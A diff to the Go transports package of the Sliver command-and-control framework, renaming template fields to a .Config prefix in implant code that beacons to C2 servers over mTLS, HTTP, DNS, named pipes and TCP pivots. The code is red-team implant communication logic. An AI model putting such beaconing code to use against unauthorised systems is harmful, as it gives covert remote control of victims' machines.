@@ -20,11 +20,11 @@ package transports
 
 import (
 
-	// {{if or .HTTPc2Enabled .TCPPivotc2Enabled}}
+	// {{if or .Config.HTTPc2Enabled .Config.TCPPivotc2Enabled}}
 	"net"
 	// {{end}}
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
@@ -38,19 +38,19 @@ import (
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	// {{if .HTTPc2Enabled}}
+	// {{if .Config.HTTPc2Enabled}}
 	"github.com/golang/protobuf/proto"
 	// {{end}}
 
-	// {{if .TCPPivotc2Enabled}}
+	// {{if .Config.TCPPivotc2Enabled}}
 	"strings"
 	// {{end}}
 )
 
 var (
-	keyPEM    = `{{.Key}}`
-	certPEM   = `{{.Cert}}`
-	caCertPEM = `{{.CACert}}`
+	keyPEM    = `{{.Config.Key}}`
+	certPEM   = `{{.Config.Cert}}`
+	caCertPEM = `{{.Config.CACert}}`
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
@@ -113,7 +113,7 @@ func (c *Connection) RemoveTunnel(ID uint64) {
 // StartConnectionLoop - Starts the main connection loop
 func StartConnectionLoop() *Connection {
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Starting connection loop ...")
 	// {{end}}
 
@@ -124,14 +124,14 @@ func StartConnectionLoop() *Connection {
 		var err error
 
 		uri := nextCCServer()
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Next CC = %s", uri.String())
 		// {{end}}
 
 		switch uri.Scheme {
 
 		// *** MTLS ***
-		// {{if .MTLSc2Enabled}}
+		// {{if .Config.MTLSc2Enabled}}
 		case "mtls":
 			connection, err = mtlsConnect(uri)
 			if err == nil {
@@ -139,7 +139,7 @@ func StartConnectionLoop() *Connection {
 				activeConnection = connection
 				return connection
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[mtls] Connection failed %s", err)
 			// {{end}}
 			connectionAttempts++
@@ -149,14 +149,14 @@ func StartConnectionLoop() *Connection {
 			fallthrough
 		case "http":
 			// *** HTTP ***
-			// {{if .HTTPc2Enabled}}
+			// {{if .Config.HTTPc2Enabled}}
 			connection, err = httpConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
 				activeConnection = connection
 				return connection
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
 			// {{end}}
 			connectionAttempts++
@@ -164,14 +164,14 @@ func StartConnectionLoop() *Connection {
 
 		case "dns":
 			// *** DNS ***
-			// {{if .DNSc2Enabled}}
+			// {{if .Config.DNSc2Enabled}}
 			connection, err = dnsConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
 				activeConnection = connection
 				return connection
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[dns] Connection failed %s", err)
 			// {{end}}
 			connectionAttempts++
@@ -179,45 +179,45 @@ func StartConnectionLoop() *Connection {
 
 		case "namedpipe":
 			// *** Named Pipe ***
-			// {{if .NamePipec2Enabled}}
+			// {{if .Config.NamePipec2Enabled}}
 			connection, err = namedPipeConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
 				activeConnection = connection
 				return connection
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[namedpipe] Connection failed %s", err)
 			// {{end}}
 			connectionAttempts++
 			// {{end}} -NamePipec2Enabled
 
 		case "tcppivot":
-			// {{if .TCPPivotc2Enabled}}
+			// {{if .Config.TCPPivotc2Enabled}}
 			connection, err = tcpPivotConnect(uri)
 			if err == nil {
 				activeC2 = uri.String()
 				activeConnection = connection
 				return connection
 			}
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[tcppivot] Connection failed %s", err)
 			// {{end}}
 			connectionAttempts++
 			// {{end}} -TCPPivotc2Enabled
 
 		default:
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("Unknown c2 protocol %s", uri.Scheme)
 			// {{end}}
 		}
 
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Sleep %d second(s) ...", reconnectInterval/time.Second)
 		// {{end}}
 		time.Sleep(reconnectInterval)
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[!] Max connection errors reached\n")
 	// {{end}}
 
@@ -225,7 +225,7 @@ func StartConnectionLoop() *Connection {
 }
 
 var ccServers = []string{
-	// {{range $index, $value := .C2}}
+	// {{range $index, $value := .Config.C2}}
 	"{{$value}}", // {{$index}}
 	// {{end}}
 }
@@ -250,7 +250,7 @@ func nextCCServer() *url.URL {
 }
 
 func GetReconnectInterval() time.Duration {
-	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
+	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
 	if err != nil {
 		return 60 * time.Second
 	}
@@ -258,16 +258,16 @@ func GetReconnectInterval() time.Duration {
 }
 
 func getMaxConnectionErrors() int {
-	maxConnectionErrors, err := strconv.Atoi(`{{.MaxConnectionErrors}}`)
+	maxConnectionErrors, err := strconv.Atoi(`{{.Config.MaxConnectionErrors}}`)
 	if err != nil {
 		return 1000
 	}
 	return maxConnectionErrors
 }
 
-// {{if .MTLSc2Enabled}}
+// {{if .Config.MTLSc2Enabled}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Connecting -> %s", uri.Host)
 	// {{end}}
 	lport, err := strconv.Atoi(uri.Port())
@@ -291,7 +291,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[mtls] lost connection, cleanup...")
 			// {{end}}
 			close(send)
@@ -326,15 +326,15 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} -MTLSc2Enabled
 
-// {{if .HTTPc2Enabled}}
+// {{if .Config.HTTPc2Enabled}}
 func httpConnect(uri *url.URL) (*Connection, error) {
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Connecting -> http(s)://%s", uri.Host)
 	// {{end}}
 	client, err := HTTPStartSession(uri.Host)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
 		// {{end}}
 		return nil, err
@@ -352,7 +352,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[http] lost connection, cleanup...")
 			// {{end}}
 			close(send)
@@ -365,7 +365,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 		defer connection.Cleanup()
 		for envelope := range send {
 			data, _ := proto.Marshal(envelope)
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[http] send envelope ...")
 			// {{end}}
 			go client.Send(data)
@@ -390,7 +390,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 					recv <- envelope
 				case net.Error:
 					if err.Timeout() {
-						// {{if .Debug}}
+						// {{if .Config.Debug}}
 						log.Printf("non-fatal error, continue")
 						// {{end}}
 						continue
@@ -398,14 +398,14 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 					return
 				case *url.Error:
 					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
-						// {{if .Debug}}
+						// {{if .Config.Debug}}
 						log.Printf("non-fatal error, continue")
 						// {{end}}
 						continue
 					}
 					return
 				default:
-					// {{if .Debug}}
+					// {{if .Config.Debug}}
 					log.Printf("[http] error: %#v", err)
 					// {{end}}
 					return
@@ -420,17 +420,17 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} -HTTPc2Enabled
 
-// {{if .DNSc2Enabled}}
+// {{if .Config.DNSc2Enabled}}
 func dnsConnect(uri *url.URL) (*Connection, error) {
 	dnsParent := uri.Hostname()
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
 	sessionID, sessionKey, err := dnsStartSession(dnsParent)
 	if err != nil {
 		return nil, err
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Starting new session with id = %s\n", sessionID)
 	// {{end}}
 
@@ -446,7 +446,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[dns] lost connection, cleanup...")
 			// {{end}}
 			close(send)
@@ -473,7 +473,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} - .DNSc2Enabled
 
-// {{if .NamePipec2Enabled}}
+// {{if .Config.NamePipec2Enabled}}
 func namedPipeConnect(uri *url.URL) (*Connection, error) {
 	conn, err := namePipeDial(uri)
 	if err != nil {
@@ -491,7 +491,7 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[namedpipe] lost connection, cleanup...")
 			// {{end}}
 			close(send)
@@ -503,7 +503,7 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 	go func() {
 		defer connection.Cleanup()
 		for envelope := range send {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
 			// {{end}}
 			namedPipeWriteEnvelope(&conn, envelope)
@@ -519,7 +519,7 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 			}
 			if err == nil {
 				recv <- envelope
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
 				// {{end}}
 			}
@@ -531,7 +531,7 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 
 // {{end}} -NamePipec2Enabled
 
-// {{if .TCPPivotc2Enabled}}
+// {{if .Config.TCPPivotc2Enabled}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
 	conn, err := net.Dial("tcp", addr)
@@ -550,7 +550,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[tcp-pivot] lost connection, cleanup...")
 			// {{end}}
 			close(send)
@@ -562,7 +562,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	go func() {
 		defer connection.Cleanup()
 		for envelope := range send {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
 			// {{end}}
 			tcpPivoteWriteEnvelope(&conn, envelope)
@@ -578,7 +578,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			}
 			if err == nil {
 				recv <- envelope
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
 				// {{end}}
 			}
@@ -598,7 +598,7 @@ func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error
 	roots := x509.NewCertPool()
 	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
 	if !ok {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to parse root certificate")
 		// {{end}}
 		os.Exit(3)
@@ -606,7 +606,7 @@ func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error
 
 	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to parse certificate: " + err.Error())
 		// {{end}}
 		return err
@@ -619,7 +619,7 @@ func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error
 		Roots: roots,
 	}
 	if _, err := cert.Verify(options); err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to verify certificate: " + err.Error())
 		// {{end}}
 		return err
